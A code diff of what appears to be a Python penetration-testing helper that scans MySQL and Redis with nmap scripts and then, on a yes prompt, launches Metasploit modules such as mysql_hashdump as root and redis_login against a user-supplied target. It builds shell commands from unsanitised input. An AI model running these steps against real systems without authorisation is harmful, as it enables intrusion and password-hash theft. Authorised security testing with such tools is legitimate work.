@@ -320,15 +320,15 @@ def main():
                         if exploit_choice == 'yes':
 
                             print("")
-                            selected_vulnerability = input(
-                                "Which Vulnerability You Need to Exploit? ")
+                            # selected_vulnerability = input(
+                            #     "Which Vulnerability You Need to Exploit? ")
                             ip = input("IP/URL Target? ")
-                            selected_lhost = input(
-                                "IP/URL Your Device/VPN (Default en0)? ").lower()
+                            # selected_lhost = input(
+                            #     "IP/URL Your Device/VPN (Default en0)? ").lower()
 
                             print("")
 
-                            metasploit_command = f"msfconsole -q -x 'search {selected_vulnerability}; use 0; set RHOSTS {ip}; set RHOST {ip}; set RPORT 6379; set LHOST {selected_lhost}; run; exit'"
+                            metasploit_command = f"msfconsole -q -x 'use scanner/redis/redis_login; set RHOSTS {ip}; set RHOST {ip}; set RPORT 6379; run; exit'"
                             os.system(metasploit_command)
 
                         elif exploit_choice == 'no':
@@ -523,17 +523,6 @@ def main():
                         f"{LCYAN}Scanning MySQL Vulnerability...\n{RESET}")
                     command = f"sudo nmap -Pn -sV --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse,mysql-dump-hashes -p 3306 {ip} -oN result.txt -vv"
 
-                    # metasploit_command = f"msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS {ip}; set RHOST {ip}; set RPORT {ports}; spool result.log; run; exit'"
-                    # os.system(metasploit_command)
-
-                    print("")
-                    hosts = f"grep -q -oh 'Version' result.txt"
-                    os.system(hosts)
-                    hosts = f"grep -q -oh 'Salt' result.txt"
-                    os.system(hosts)
-                    hosts = f"grep -q -oh 'root:' result.txt"
-                    os.system(hosts)
-
                     try:
                         with open(os.devnull, 'w') as nullfile:
                             subprocess.check_call(command, shell=True,
@@ -541,12 +530,49 @@ def main():
                     except subprocess.CalledProcessError:
                         print("Error occurred while running the Nmap scan.")
                         print("")
-                    check_and_display_vulnerabilities("result.txt")
+                    # hosts = f"grep -A 0 'Version' result.txt"
+                    # os.system(hosts)
+                    # hosts = f"grep -A 0 'Salt' result.txt"
+                    # os.system(hosts)
+                    # hosts = f"grep -A 0 'root' result.txt"
+                    # os.system(hosts)
+                    vulnerabilities_found = check_and_display_vulnerabilities(
+                        "result.txt")
+
+                    # Prompt the user for exploitation after displaying all vulnerabilities
+                    if vulnerabilities_found:
+                        exploit_choice = input(
+                            f"{LCYAN}Do you want to exploit any of the vulnerabilities? {RESET}(yes/no): ").lower()
+
+                        # Check user's choice and call the function accordingly
+                        if exploit_choice == 'yes':
+
+                            print("")
+                            # selected_vulnerability = input(
+                            #     "Which Vulnerability You Need to Exploit? ")
+                            ip = input("IP/URL Target? ")
+                            selected_lhost = input(
+                                "IP/URL Your Device/VPN (Default en0)? ").lower()
+
+                            print("")
+
+                            metasploit_command = f"msfconsole -q -x 'use scanner/mysql/mysql_hashdump; set RHOSTS {ip}; set RHOST {ip}; set RPORT 3306; set username root; run; exit'"
+                            os.system(metasploit_command)
+
+                            print("")
+
+                        elif exploit_choice == 'no':
+                            print("Not exploiting any vulnerabilities.")
+                        else:
+                            print("Invalid choice. Please enter 'yes' or 'no'.")
+                    else:
+                        print(
+                            "\nNo vulnerabilities found with minimum or low severity.")
 
                 # Add other port checks similarly...
                 
-                vulnerabilities_found = check_and_display_vulnerabilities(
-                        "result.txt")
+                # vulnerabilities_found = check_and_display_vulnerabilities(
+                #         "result.txt")
 
                 retry_option = input(
                     "\n===>> Do you want to scan another port (y) or exit the program (exit): ").lower()
